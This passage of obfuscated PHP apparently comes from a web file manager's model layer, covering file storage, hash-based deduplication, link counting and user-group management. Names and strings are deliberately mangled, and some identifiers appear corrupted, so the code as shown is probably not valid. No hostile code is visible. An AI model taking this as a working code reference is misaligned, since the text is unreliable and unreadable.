$Ÿ´­ÑèÈ => $äìÉû‹ß) { if (is_array($äìÉû‹ß) && isset($äìÉû‹ß[0]) && is_string($äìÉû‹ß[0]) && strtolower($äìÉû‹ß[0]) == $ú‘ı°ñ·[7] && is_array($äìÉû‹ß[1]) && count($äìÉû‹ß[1]) > $Œäëô§®) { ignore_timeout(); return $Ÿ´­ÑèÈ; } } return !1; } public function setMasterDB($æõÖÛšŸ = true) { think_config($_SERVER[ê‘³Æ±][390], $æõÖÛšŸ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\x74\145\x6d\117\160\164\x69\x6f\156"; public $field = array(); public function listData($ãôƒšÔ = false, $§ÁŸøâ’ = "\x6d\157\144\x69\146\171\124\x69\155\x65", $äõÛ×É = false) { $¡Øı¶Ò = Model($this->modelType)->get(!1, $this->optionType, !0); $×½—¤ßæ = array_values($¡Øı¶Ò); if ($×½—¤ßæ && $×½—¤ßæ[0] && !is_array($×½—¤ßæ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¡Øı¶Ò = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¡Øı¶Ò) { return $ãôƒšÔ ? null : array(); } if (!$ãôƒšÔ) { $¡Øı¶Ò = array_filter(array_values($¡Øı¶Ò)); return array_sort_by($¡Øı¶Ò, $§ÁŸøâ’, $äõÛ×É); } return $¡Øı¶Ò[$_SERVER[ê‘³Æ±][391] . $ãôƒšÔ]; } public function insert($°»Üªë²) { $º„¿Èõó =& $_SERVER[ê‘³Æ±]; $°»Üªë² = array_field_key($°»Üªë², $this->field); $¾£‚î†è = Model($this->modelType)->get($º„¿Èõó[392], $this->optionType . $º„¿Èõó[393]); $¾£‚î†è = $¾£‚î†è ? $¾£‚î†è : 0; $°»Üªë²[$º„¿Èõó[394]] = ++$¾£‚î†è; $°»Üªë²[$º„¿Èõó[195]] = time(); $°»Üªë²[$º„¿Èõó[86]] = time(); Model($this->modelType)->set($º„¿Èõó[392], $¾£‚î†è, $this->optionType . $º„¿Èõó[393]); Model($this->modelType)->set($º„¿Èõó[391] . $¾£‚î†è, $°»Üªë², $this->optionType); return $¾£‚î†è; } public function update($šà§ò†Ì, $¿èÌŞ‡Ø) { $Ô®Ëñ¢ =& $_SERVER[ê‘³Æ±]; $¿èÌŞ‡Ø = array_field_key($¿èÌŞ‡Ø, $this->field); $Çş¬¶’ = $this->listData($šà§ò†Ì); if (!$Çş¬¶’ || !$šà§ò†Ì) { return !1; } $¿èÌŞ‡Ø = array_merge($Çş¬¶’, $¿èÌŞ‡Ø); $¿èÌŞ‡Ø[$Ô®Ëñ¢[86]] = time(); return Model($this->modelType)->set($Ô®Ëñ¢[391] . $šà§ò†Ì, $¿èÌŞ‡Ø, $this->optionType); } public function remove($áü¸§â“) { if (!$áü¸§â“) { return !1; } return Model($this->modelType)->remove($_SERVER[ê‘³Æ±][391] . $áü¸§â“, $this->optionType); } public function clear() { $çè’ÛÙá =& $_SERVER[ê‘³Æ±]; Model($this->modelType)->remove($çè’ÛÙá[392], $this->optionType . $çè’ÛÙá[393]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($±—…ê¿‹, $Ã±µíê) { if (!$Ã±µíê) { return !1; } $Ğá§Ç Ö = $this->listData(); $Ğá§Ç Ö = array_to_keyvalue($Ğá§Ç Ö, $±—…ê¿‹); return isset($Ğá§Ç Ö[$Ã±µíê]) ? $Ğá§Ç Ö[$Ã±µíê] : !1; } public function findByName($ùš£ÈÃ) { return $this->findByKey($_SERVER[ê‘³Æ±][32], $ùš£ÈÃ); } protected function resetData($ê³÷Õõî) { $µô‹úƒœ =& $_SERVER[ê‘³Æ±]; $ê³÷Õõî = is_array($ê³÷Õõî) ? $ê³÷Õõî : array(); $ÈıÄã¯Ø = array(); for ($øÔş¯• = 0; $øÔş¯• < count($ê³÷Õõî); $øÔş¯•++) { $ÈıÄã¯Ø[$µô‹úƒœ[391] . $ê³÷Õõî[$øÔş¯•][$µô‹úƒœ[394]]] = $ê³÷Õõî[$øÔş¯•]; } return Model($this->modelType)->set($ÈıÄã¯Ø, !1, $this->optionType); } private function getAutoName($ûµ¶òñÔ) { $Ú¼™Í— = array_to_keyvalue($this->listData(), $_SERVER[ê‘³Æ±][32]); if (!$Ú¼™Í— || !isset($Ú¼™Í—[$ûµ¶òñÔ])) { return $ûµ¶òñÔ; } for ($¬ÜÜú‘ = 1; $¬ÜÜú‘ < count($Ú¼™Í—); $¬ÜÜú‘++) { $¯¼œû = $ûµ¶òñÔ . "\x28{$¬ÜÜú‘}\51"; if (!isset($Ú¼™Í—[$¯¼œû])) { return $¯¼œû; } } return $¯¼œû; } } goto eëÀğÊöŒŒ; c°ŸÉ‡Â“ñ: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\151\x6c\x65\x5f\143\157\156\164\145\156\x74\163"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\151\x6d\x65", "\164\151\x6d\x65", "\x69\x6e\163\145\x72\x74", "\x66\x75\x6e\143\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\x65" => "\x69\x6f\x5f\146\x69\154\145\x5f\155\x65\164\141", "\x6d\x65\x74\141\106\151\x65\154\144" => "\146\151\x6c\x65\111\x44"); public function fileInfo($ÁìÖÄÃ¯) { $œµÈÁ”¾ =& $_SERVER[ê‘³Æ±]; static $éğæºå¶ = array(); if (!isset($éğæºå¶[$ÁìÖÄÃ¯])) { $øîùã¹§ = $œµÈÁ”¾[1857]; $”ÜãŸ¢— = Model($œµÈÁ”¾[463])->field($øîùã¹§)->where(array($œµÈÁ”¾[461] => $ÁìÖÄÃ¯))->find(); $éğæºå¶[$ÁìÖÄÃ¯] = $”ÜãŸ¢—; } return $éğæºå¶[$ÁìÖÄÃ¯]; } public function addFileByContent($ßõÔœµ‡ = '', $¨ï„ì™Ÿ = '') { $««¨û¨ =& $_SERVER[ê‘³Æ±]; $µÈ×¨Ù‚ = TEMP_PATH . $««¨û¨[1858]; if (!is_dir($µÈ×¨Ù‚)) { mk_dir($µÈ×¨Ù‚); } $íÁÆı°ç = $µÈ×¨Ù‚ . $««¨û¨[1859] . rand_string(16); file_put_contents($íÁÆı°ç, $ßõÔœµ‡); $Ûåª€ğ½ = $this->addFile($íÁÆı°ç, $¨ï„ì™Ÿ, !0); if (file_exists($íÁÆı°ç)) { @unlink($íÁÆı°ç); } return $Ûåª€ğ½; } public function createFileName($Ÿ¸íşò, $åª©ƒî = false, $¼¿ä³ãÕ = false) { $Æİ„”© =& $_SERVER[ê‘³Æ±]; $åª›ÄÄˆ = IO::init($Æİ„”©[8]); $¨ş·âÃõ = $this->makeFilePath($Ÿ¸íşò, $åª›ÄÄˆ, $åª©ƒî, $¼¿ä³ãÕ); $ˆ ô±‰ = $åª›ÄÄˆ->pathFather($¨ş·âÃõ); static $óŸËĞø¨ = false; $Õ”Š¶•¾ = $Æİ„”©[1860] . md5($ˆ ô±‰); if (!$óŸËĞø¨ && !Cache::get($Õ”Š¶•¾)) { $óŸËĞø¨ = !0; $éåà™˜Õ = IO::mkdir($ˆ ô±‰); if (!IO::exist($éåà™˜Õ . $Æİ„”©[783])) { IO::mkfile($éåà™˜Õ . $Æİ„”©[783]); } Cache::set($Õ”Š¶•¾, 1, 3600 * 2); } return $¨ş·âÃõ; } public function makeFilePath($ÄÃøØ‡Å, $îæœĞÍñ, $—œ­«Ÿ× = false, $š°Å µ§ = false) { $ºÜÒ–×Ò =& $_SERVER[ê‘³Æ±]; $¯àÖœè = Model($ºÜÒ–×Ò[756])->get($ºÜÒ–×Ò[1861]); $³™Ğóë = KodIO::defaultIO() . date($ºÜÒ–×Ò[1862]); $€úõÄ»… = $³™Ğóë . rand_string(5) . short_id(100); $ÄÃøØ‡Å = str_replace($ºÜÒ–×Ò[8], $ºÜÒ–×Ò[11], KodIO::clear($ÄÃøØ‡Å)); $•Ú¡ÈÃã = $îæœĞÍñ->ext($ÄÃøØ‡Å); if (!$ÄÃøØ‡Å) { $¯àÖœè = $ºÜÒ–×Ò[1863]; } switch ($¯àÖœè) { case $ºÜÒ–×Ò[1864]: $€úõÄ»… = $€úõÄ»… . $ºÜÒ–×Ò[10] . $îæœĞÍñ->ext($ÄÃøØ‡Å); if ($•Ú¡ÈÃã == $ºÜÒ–×Ò[1802]) { $€úõÄ»… .= $ºÜÒ–×Ò[1537]; } break; case $ºÜÒ–×Ò[1865]: $Æ›ê´†ı = Model($ºÜÒ–×Ò[756])->get($ºÜÒ–×Ò[757]); $Õ™»¢×Ë = substr(md5($ºÜÒ–×Ò[758] . $Æ›ê´†ı . date($ºÜÒ–×Ò[734])), 0, 8); $µĞÂÚ  = KodIO::defaultDriver(); $³™Ğóë = $ºÜÒ–×Ò[1216] . $µĞÂÚ [$ºÜÒ–×Ò[394]] . $ºÜÒ–×Ò[403] . date($ºÜÒ–×Ò[1866]) . $Õ™»¢×Ë . $ºÜÒ–×Ò[8]; if ($•Ú¡ÈÃã == $ºÜÒ–×Ò[1802]) { $ÄÃøØ‡Å .= $ºÜÒ–×Ò[1537]; } $Õ²›—ĞÕ = $ºÜÒ–×Ò[1867] . $³™Ğóë . $ÄÃøØ‡Å; CacheLock::lock($Õ²›—ĞÕ); $€úõÄ»… = $³™Ğóë . $ÄÃøØ‡Å; if (IO::exist($³™Ğóë . $ÄÃøØ‡Å)) { $²‹Ğ•Ğ  = substr($ÄÃøØ‡Å, 0, strlen($ÄÃøØ‡Å) - strlen($•Ú¡ÈÃã)); $Ö·«µŸ = $š°Å µ§ ? substr($š°Å µ§, 0, 5) : ($—œ­«Ÿ× ? substr($—œ­«Ÿ×, 0, 5) : rand_string(5)); $€úõÄ»… = $³™Ğóë . $²‹Ğ•Ğ  . $Ö·«µŸ . $ºÜÒ–×Ò[10] . $•Ú¡ÈÃã; } if (IO::isTypeObject($€úõÄ»…) && !IO::isUploadServer($€úõÄ»…)) { if (IO::exist($€úõÄ»…)) { return $€úõÄ»…; } $»•™Ü¦É = IO::setContent($€úõÄ»…, $ºÜÒ–×Ò[12]); if (!$»•™Ü¦É) { show_json($ºÜÒ–×Ò[1868], !1); } } CacheLock::unlock($Õ²›—ĞÕ); break; case $ºÜÒ–×Ò[1863]: break; default: break; } return $€úõÄ»…; } public function addFileByRemote($¤Óğ»€¯, $Ë“¥Ç¬¥, $ÚÛ©ˆ± = array()) { $õ§Ÿñ‰‹ =& $_SERVER[ê‘³Æ±]; if (!IO::exist($¤Óğ»€¯)) { return !1; } $±ò†”Û™ = $ÚÛ©ˆ±[$õ§Ÿñ‰‹[171]] ? $ÚÛ©ˆ±[$õ§Ÿñ‰‹[171]] : $õ§Ÿñ‰‹[12]; $–šòÊ»û = IO::hashMd5($¤Óğ»€¯, $±ò†”Û™); $¬™ˆ˜š© = KodIO::defaultDriver(); $¨¨¬é¯  = array($õ§Ÿñ‰‹[575] => IO::size($¤Óğ»€¯), $õ§Ÿñ‰‹[1869] => 1, $õ§Ÿñ‰‹[414] => $Ë“¥Ç¬¥, $õ§Ÿñ‰‹[802] => $¬™ˆ˜š©[$õ§Ÿñ‰‹[394]], $õ§Ÿñ‰‹[415] => $¤Óğ»€¯, $õ§Ÿñ‰‹[1870] => $ÚÛ©ˆ±[$õ§Ÿñ‰‹[172]] ? $ÚÛ©ˆ±[$õ§Ÿñ‰‹[172]] : IO::hashSimple($¤Óğ»€¯), $õ§Ÿñ‰‹[1871] => $–šòÊ»û ? $–šòÊ»û : $±ò†”Û™); if ($Ä¥ßæœø = $this->addFileCheckExist($¨¨¬é¯ [$õ§Ÿñ‰‹[172]], $¨¨¬é¯ [$õ§Ÿñ‰‹[171]], $¨¨¬é¯ [$õ§Ÿñ‰‹[80]])) { return $Ä¥ßæœø; } return $this->addFileData($¨¨¬é¯ ); } private function addFileData($¾¨¼’ò“) { $ÎÜ¹´ˆû =& $_SERVER[ê‘³Æ±]; if (!$¾¨¼’ò“) { return !1; } $¾¨¼’ò“[$ÎÜ¹´ˆû[80]] = intval($¾¨¼’ò“[$ÎÜ¹´ˆû[80]]); if (!$¾¨¼’ò“[$ÎÜ¹´ˆû[80]] && strlen($¾¨¼’ò“[$ÎÜ¹´ˆû[172]]) > 32) { $¾¨¼’ò“[$ÎÜ¹´ˆû[80]] = intval(substr($¾¨¼’ò“[$ÎÜ¹´ˆû[172]], 32)); } $áØùÕú = $this->add($¾¨¼’ò“); return $this->find($áØùÕú); } public function addFile($£”Ãç»Ğ, $ìÓõÅä™, $¨å•ï¾ø = false) { $İ³©ç·¤ =& $_SERVER[ê‘³Æ±]; $ŸÍ¹¢ş‰ = IO::hashSimple($£”Ãç»Ğ); $˜ÒÃ‘÷¬ = IO::size($£”Ãç»Ğ); $ş†Àè•Ú = $˜ÒÃ‘÷¬ <= 1024 * 1024 * 10 ? IO::hashMd5($£”Ãç»Ğ) : $İ³©ç·¤[12]; $êìŞ©¿š = $İ³©ç·¤[1872] . $ŸÍ¹¢ş‰; CacheLock::lock($êìŞ©¿š); if ($ş†Àè•Ú && $ŸÍ¹¢ş‰) { $”¬¸ˆ»à = $this->addFileCheckExist($ŸÍ¹¢ş‰, $ş†Àè•Ú, $˜ÒÃ‘÷¬); if ($”¬¸ˆ»à) { CacheLock::unlock($êìŞ©¿š); return $”¬¸ˆ»à; } } $Åó·€¹ˆ = $this->addFileMake($£”Ãç»Ğ, $˜ÒÃ‘÷¬, $ŸÍ¹¢ş‰, $ş†Àè•Ú, $ìÓõÅä™, $¨å•ï¾ø); $•óë«¹ş = $this->addFileData($Åó·€¹ˆ); CacheLock::unlock($êìŞ©¿š); if (!$ş†Àè•Ú && $•óë«¹ş) { $this->fileMd5Check($•óë«¹ş); } return $•óë«¹ş; } private function fileMd5Check($­ÛÃÂûå) { $Ö¼±ãâ© =& $_SERVER[ê‘³Æ±]; $›–©û¸Ÿ = array($­ÛÃÂûå[$Ö¼±ãâ©[460]], $­ÛÃÂûå[$Ö¼±ãâ©[78]]); $Éú¼–Í¨ = $Ö¼±ãâ©[1873] . $­ÛÃÂûå[$Ö¼±ãâ©[78]]; $˜ÏñŞ’ = $Ö¼±ãâ©[1874] . $­ÛÃÂûå[$Ö¼±ãâ©[460]]; $Ø¨ñ© ö = TaskQueue::add($Ö¼±ãâ©[1875], $›–©û¸Ÿ, $Éú¼–Í¨, $˜ÏñŞ’); if (!$Ø¨ñ© ö) { $this->fileMd5Set($­ÛÃÂûå[$Ö¼±ãâ©[460]], $­ÛÃÂûå[$Ö¼±ãâ©[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($äÔ·í–½, $¡Í Ÿ) { $Ğ™¸ğŞ¨ =& $_SERVER[ê‘³Æ±]; $Û”î‘Ô¡ = $this->find($äÔ·í–½); if (!$Û”î‘Ô¡ || $Û”î‘Ô¡[$Ğ™¸ğŞ¨[171]]) { return; } $“ŞâÑ»¹ = IO::hashMd5($¡Í Ÿ); if (!$“ŞâÑ»¹) { return $Ğ™¸ğŞ¨[12]; } $this->where(array($Ğ™¸ğŞ¨[460] => $äÔ·í–½))->save(array($Ğ™¸ğŞ¨[171] => $“ŞâÑ»¹)); } public function addFileMake($ÌÕñç©Œ, $ÌÃØÀÇì, $“Œ´ ÂÚ, $ï—˜ˆ, $™ÜŒÖ½, $äúü””Ã) { $ÄÅœİ¦ş =& $_SERVER[ê‘³Æ±]; $¯Û½»Ôê = $this->createFileName($™ÜŒÖ½, $“Œ´ ÂÚ, $ï—˜ˆ); $ÉÔ¿è»™ = get_path_father($¯Û½»Ôê); $ˆì‚ôõÄ = get_path_this($¯Û½»Ôê); if ($äúü””Ã) { $¥ÄÔÇ°· = IO::move($ÌÕñç©Œ, $ÉÔ¿è»™, !1, $ˆì‚ôõÄ); } else { $¥ÄÔÇ°· = IO::copy($ÌÕñç©Œ, $ÉÔ¿è»™, !1, $ˆì‚ôõÄ); } if (!$¥ÄÔÇ°·) { return !1; } $“ô¸õà„ = KodIO::defaultDriver(); $ÀˆË±’å = array($ÄÅœİ¦ş[575] => $ÌÃØÀÇì, $ÄÅœİ¦ş[1869] => 1, $ÄÅœİ¦ş[414] => $™ÜŒÖ½, $ÄÅœİ¦ş[802] => $“ô¸õà„[$ÄÅœİ¦ş[394]], $ÄÅœİ¦ş[415] => $¯Û½»Ôê, $ÄÅœİ¦ş[1870] => $“Œ´ ÂÚ, $ÄÅœİ¦ş[1871] => $ï—˜ˆ); return $ÀˆË±’å; } public function addFileCheckExist($œ¤„»äŸ, $‰«ß÷şª, $†£‘¦Ùè) { $ÂÀºÇ…õ =& $_SERVER[ê‘³Æ±]; $°ã¡—ÃÒ = $this->findByHash($œ¤„»äŸ, $‰«ß÷şª); if (!$°ã¡—ÃÒ) { return !1; } $ÁßáÜŒÄ = array($ÂÀºÇ…õ[1869] => intval($°ã¡—ÃÒ[$ÂÀºÇ…õ[1876]]) + 1, $ÂÀºÇ…õ[575] => $†£‘¦Ùè); $this->where(array($ÂÀºÇ…õ[461] => $°ã¡—ÃÒ[$ÂÀºÇ…õ[460]]))->save($ÁßáÜŒÄ); return $°ã¡—ÃÒ; } public function remove($Ğ‰áÑ×â) { $this->linkCountChange($Ğ‰áÑ×â, !1); $this->clearEmpty(); return !0; } public function linkAdd($Â—™Ä»ë) { $this->linkCountChange($Â—™Ä»ë, !0); } public function linkCountChange($¹ßä‚Õƒ, $àĞÕ‘») { $û¨ÄèÉÄ =& $_SERVER[ê‘³Æ±]; if (!$¹ßä‚Õƒ) { return; } if (!is_array($¹ßä‚Õƒ)) { $¹ßä‚Õƒ = array($¹ßä‚Õƒ); } $ŸåËìƒƒ = array(); foreach ($¹ßä‚Õƒ as $ñĞšôçÙ) { $½ÀùÖ· = $ñĞšôçÙ . $û¨ÄèÉÄ[12]; if (!$ŸåËìƒƒ[$½ÀùÖ·]) { $ŸåËìƒƒ[$½ÀùÖ·] = 0; } $ŸåËìƒƒ[$½ÀùÖ·]++; } $±ıšæë— = array(); foreach ($ŸåËìƒƒ as $ñĞšôçÙ => $—ˆçŸõ) { $½ÀùÖ· = $—ˆçŸõ . $û¨ÄèÉÄ[12]; if (!$±ıšæë—[$½ÀùÖ·]) { $±ıšæë—[$½ÀùÖ·] = array(); } $±ıšæë—[$½ÀùÖ·][] = $ñĞšôçÙ; } foreach ($±ıšæë— as $—ˆçŸõ => $ÀæÂŠÛ†) { if (!$ÀæÂŠÛ†) { continue; } $—ˆçŸõ = $àĞÕ‘» ? $—ˆçŸõ : -intval($—ˆçŸõ); $°¥‹…— = array($û¨ÄèÉÄ[460] => array($û¨ÄèÉÄ[7], $ÀæÂŠÛ†)); if ($—ˆçŸõ < 0) { $°¥‹…—[$û¨ÄèÉÄ[1876]] = array($û¨ÄèÉÄ[1004], abs($—ˆçŸõ)); } $this->where($°¥‹…—)->setAdd($û¨ÄèÉÄ[1876], $—ˆçŸõ); } } public function findByHash($ÃÎ•´š, $œÌáòş× = false) { $¬íò°§ =& $_SERVER[ê‘³Æ±]; if (!$ÃÎ•´š && !$œÌáòş×) { return !1; } $½ö‚ëüà = array($¬íò°§[1870] => $ÃÎ•´š); if ($œÌáòş×) { $½ö‚ëüà = array($¬íò°§[1871] => $œÌáòş×); } return $this->order($¬íò°§[1877])->where($½ö‚ëüà)->find(); } public function clearEmpty($˜ÙÖÜ‹± = 0) { $€£–©ìù =& $_SERVER[ê‘³Æ±]; $å–ıÎåõ = time() - 3600 * 24 * $˜ÙÖÜ‹±; $’‘åïõó = $€£–©ìù[1878] . $å–ıÎåõ; $Ã™ıÛª¢ = $this->where($’‘åïõó)->select(); if (!$Ã™ıÛª¢) { return; } $”ÄşµØ = new Task($€£–©ìù[1879], $€£–©ìù[12], count($Ã™ıÛª¢)); foreach ($Ã™ıÛª¢ as $²†¿°˜Ì) { $”ÄşµØ->update(1); $this->resetFile($²†¿°˜Ì); } $”ÄşµØ->end(); } public function resetFile($ÊùéàôÓ) { $Ä‚Š™İŒ =& $_SERVER[ê‘³Æ±]; $ÎØã„¥ = array($Ä‚Š™İŒ[461] => $ÊùéàôÓ[$Ä‚Š™İŒ[460]]); $Œûï•Óò = Model($Ä‚Š™İŒ[1314])->where($ÎØã„¥)->count(); $—¹Öµ€µ = Model($Ä‚Š™İŒ[1880])->where($ÎØã„¥)->count(); $ÔÈÜ¢×Â = intval($Œûï•Óò) + intval($—¹Öµ€µ); if ($ÔÈÜ¢×Â == 0) { IO::remove($ÊùéàôÓ[$Ä‚Š™İŒ[78]]); Model($Ä‚Š™İŒ[1881])->delete($ÊùéàôÓ[$Ä‚Š™İŒ[460]]); $this->where($ÎØã„¥)->delete(); $this->metaSet($ÊùéàôÓ[$Ä‚Š™İŒ[460]], null, null); return; } if ($ÊùéàôÓ[$Ä‚Š™İŒ[1876]] != $ÔÈÜ¢×Â) { $this->where($ÎØã„¥)->save(array($Ä‚Š™İŒ[1869] => $ÔÈÜ¢×Â)); } } public function storageInfo($Ÿ•Ë‹ö¢ = false) { $ ßò¼ =& $_SERVER[ê‘³Æ±]; $Œ¬²’¥ = $this->count() + 0.0; $ğ¾‘² = 0; $œÒ±ğÊÀ = 1; $ÅŸÒÂ­á = 0; $ŸÀ³¬Ö = 5000; for ($«á¬²Ò€ = 0; $«á¬²Ò€ < $Œ¬²’¥; $«á¬²Ò€ = $«á¬²Ò€ + $ŸÀ³¬Ö) { $Òğ²¾Ñ = $this->limit($«á¬²Ò€, $«á¬²Ò€ + $ŸÀ³¬Ö)->select(); foreach ($Òğ²¾Ñ as $èñïı¬Ê) { $œÒ±ğÊÀ += $èñïı¬Ê[$ ßò¼[80]] * $èñïı¬Ê[$ ßò¼[1876]]; $ğ¾‘² += $èñïı¬Ê[$ ßò¼[80]] * ($èñïı¬Ê[$ ßò¼[1876]] - 1); $ÅŸÒÂ­á += $èñïı¬Ê[$ ßò¼[1876]]; } } $‰ŠˆıáÌ = array($ ßò¼[1882] => $œÒ±ğÊÀ, $ ßò¼[1883] => $ğ¾‘², $ ßò¼[1884] => $ğ¾‘² / $œÒ±ğÊÀ, $ ßò¼[84] => $Œ¬²’¥, $ ßò¼[1885] => $ÅŸÒÂ­á); return $‰ŠˆıáÌ; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\x75\x70"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\x6d\x65" => "\x67\162\157\x75\x70\x5f\155\145\164\x61", "\155\145\x74\141\x46\151\145\x6c\x64" => "\x67\x72\157\x75\x70\x49\104"); protected function cacheFunctionAlias($öôş…ò) { $Û ‘Íò =& $_SERVER[ê‘³Æ±]; return array($Û ‘Íò[1886] => array($öôş…ò[0], $Û ‘Íò[1887]), $Û ‘Íò[1888] => array($öôş…ò[0], $Û ‘Íò[1889])); } protected function getInfo($é­ÀÛ¨, $°„ò•Å = false) { $ÎÕÏŸü¾ = $this->getInfoSimple($é­ÀÛ¨); if (!$ÎÕÏŸü¾) { return !1; } if ($°„ò•Å) { return $this->_listDataApplyItem($ÎÕÏŸü¾); } return $this->cacheFunctionGet($_SERVER[ê‘³Æ±][1890], $é­ÀÛ¨); } protected function getInfoSimple($¬»õéß˜, $÷±•ó±Á = false) { $Ò»àæ¬ =& $_SERVER[ê‘³Æ±]; if ($÷±•ó±Á) { $™Çùö× = array($Ò»àæ¬[1809] => intval($¬»õéß˜)); $üö¶º»¼ = $this->where($™Çùö×)->find(); return is_array($üö¶º»¼) ? $üö¶º»¼ : array(); } return $this->cacheFunctionGet($Ò»àæ¬[1891], $¬»õéß˜); } protected function groupAdd($™¸ÚüºÅ) { $Ö“¬µ÷ë =& $_SERVER[ê‘³Æ±]; if (!$™¸ÚüºÅ[$Ö“¬µ÷ë[491]] && isset($™¸ÚüºÅ[$Ö“¬µ÷ë[1809]]) && $™¸ÚüºÅ[$Ö“¬µ÷ë[1809]] == 1) { if ($€†Şåû¦ = $this->getInfoSimple($™¸ÚüºÅ[$Ö“¬µ÷ë[1809]], !0)) { return $™¸ÚüºÅ[$Ö“¬µ÷ë[1809]]; } } else { $€†Şåû¦ = $this->getInfoSimple($™¸ÚüºÅ[$Ö“¬µ÷ë[491]]); if (!$€†Şåû¦) { return !1; } } $ÊÎ†”ÜÜ = $Ö“¬µ÷ë[524]; if ($€†Şåû¦[$Ö“¬µ÷ë[514]]) { $ÊÎ†”ÜÜ = $€†Şåû¦[$Ö“¬µ÷ë[514]] . $€†Şåû¦[$Ö“¬µ÷ë[1809]] . $Ö“¬µ÷ë[50]; } $û¦ûÌõ = array($Ö“¬µ÷ë[414] => $this->groupNameAuto($™¸ÚüºÅ[$Ö“¬µ÷ë[491]], $™¸ÚüºÅ[$Ö“¬µ÷ë[32]]), $Ö“¬µ÷ë[395] => $™¸ÚüºÅ[$Ö“¬µ÷ë[491]], $Ö“¬µ÷ë[580] => $ÊÎ†”ÜÜ, $Ö“¬µ÷ë[1892] => $™¸ÚüºÅ[$Ö“¬µ÷ë[1796]], $Ö“¬µ÷ë[1893] => 0, $Ö“¬µ÷ë[1813] => 0); if (isset($™¸ÚüºÅ[$Ö“¬µ÷ë[1832]])) { $û¦ûÌõ[$Ö“¬µ÷ë[1832]] = $™¸ÚüºÅ[$Ö“¬µ÷ë[1832]]; } else { $®îÌí³ = $this->max($Ö“¬µ÷ë[1832]); if (!$®îÌí³) { $®îÌí³ = 0; } $û¦ûÌõ[$Ö“¬µ÷ë[1832]] = $®îÌí³ + 1; } if (!empty($™¸ÚüºÅ[$Ö“¬µ÷ë[1809]])) { $û¦ûÌõ[$Ö“¬µ÷ë[1809]] = $™¸ÚüºÅ[$Ö“¬µ÷ë[1809]]; } $¢Í£‰¤ã = $this->add($û¦ûÌõ); $this->setNamePinyin($¢Í£‰¤ã, $û¦ûÌõ[$Ö“¬µ÷ë[32]]); if (isset($™¸ÚüºÅ[$Ö“¬µ÷ë[1894]])) { $this->metaSet($¢Í£‰¤ã, array($Ö“¬µ÷ë[1894] => $™¸ÚüºÅ[$Ö“¬µ÷ë[1894]], $Ö“¬µ÷ë[1895] => $™¸ÚüºÅ[$Ö“¬µ÷ë[1895]])); unset($™¸ÚüºÅ[$Ö“¬µ÷ë[1894]]); unset($™¸ÚüºÅ[$Ö“¬µ÷ë[1895]]); } Model($Ö“¬µ÷ë[1314])->groupRootAdd($¢Í£‰¤ã); return $¢Í£‰¤ã; } protected function groupEdit($˜—µ¿Ø÷, $ãÉáŒ©) { $ŞŠ±º· =& $_SERVER[ê‘³Æ±]; $™ ß†¥Ø = $this->getInfoSimple($˜—µ¿Ø÷); if (!$™ ß†¥Ø) { return !1; } if (!empty($ãÉáŒ©[$ŞŠ±º·[491]])) { $ˆ¹¦ãÈö = $this->getInfoSimple($ãÉáŒ©[$ŞŠ±º·[491]]); if (!$ˆ¹¦ãÈö) { return !1; } if ($™ ß†¥Ø[$ŞŠ±º·[1809]] == $ˆ¹¦ãÈö[$ŞŠ±º·[1809]]) { return !1; } if ($ãÉáŒ©[$ŞŠ±º·[491]] != $™ ß†¥Ø[$ŞŠ±º·[491]]) { if ($ˆ¹¦ãÈö[$ŞŠ±º·[514]] !== $™ ß†¥Ø[$ŞŠ±º·[514]] && strpos($ˆ¹¦ãÈö[$ŞŠ±º·[514]], $™ ß†¥Ø[$ŞŠ±º·[514]] . $™ ß†¥Ø[$ŞŠ±º·[1809]] . $ŞŠ±º·[50]) === 0) { return !1; } $ãÉáŒ©[$ŞŠ±º·[580]] = $ˆ¹¦ãÈö[$ŞŠ±º·[514]] . $ãÉáŒ©[$ŞŠ±º·[491]] . $ŞŠ±º·[50]; $this->_changeChildLevel($™ ß†¥Ø, $ˆ¹¦ãÈö); } } if (isset($ãÉáŒ©[$ŞŠ±º·[32]])) { $this->setNamePinyin($˜—µ¿Ø÷, $ãÉáŒ©[$ŞŠ±º·[32]]); } if (isset($ãÉáŒ©[$ŞŠ±º·[1894]])) { $this->metaSet($˜—µ¿Ø÷, array($ŞŠ±º·[1894] => $ãÉáŒ©[$ŞŠ±º·[1894]], $ŞŠ±º·[1895] => $ãÉáŒ©[$ŞŠ±º·[1895]])); unset($ãÉáŒ©[$ŞŠ±º·[1894]]); unset($ãÉáŒ©[$ŞŠ±º·[1895]]); } $this->_clearChildrenCache($™ ß†¥Ø); return $this->where(array($ŞŠ±º·[1896] => $˜—µ¿Ø÷))->save($ãÉáŒ©); } private function _clearChildrenCache($¡‰ïççå) { $Ê›ïƒ¦Ë =& $_SERVER[ê‘³Æ±]; $ò¶ÔøŠÙ = array($Ê›ïƒ¦Ë[580] => array($Ê›ïƒ¦Ë[540], $¡‰ïççå[$Ê›ïƒ¦Ë[514]] . $¡‰ïççå[$Ê›ïƒ¦Ë[1809]] . $Ê›ïƒ¦Ë[541])); $”ÕœæÇê = $this->field($Ê›ïƒ¦Ë[1809])->where($ò¶ÔøŠÙ)->select(); foreach ($”ÕœæÇê as $Õß±­ş¯) { $this->_clearCache($Õß±­ş¯[$Ê›ïƒ¦Ë[1809]]); } } private function _clearCache($ªï·ì´Ç) { $’ß©±ù’ =& $_SERVER[ê‘³Æ±]; $this->cacheFunctionClear($’ß©±ù’[1890], $ªï·ì´Ç); $this->cacheFunctionClear($’ß©±ù’[1891], $ªï·ì´Ç); } private function _changeChildLevel($»ôü†“, $íÑ’íÍ, $¸‚¬¢¥§ = false) { $ÙĞ¿ó¦‡ =& $_SERVER[ê‘³Æ±]; $³ğú´ = $»ôü†“[$ÙĞ¿ó¦‡[514]] . $»ôü†“[$ÙĞ¿ó¦‡[1809]] . $ÙĞ¿ó¦‡[50]; $˜éù´ßË = 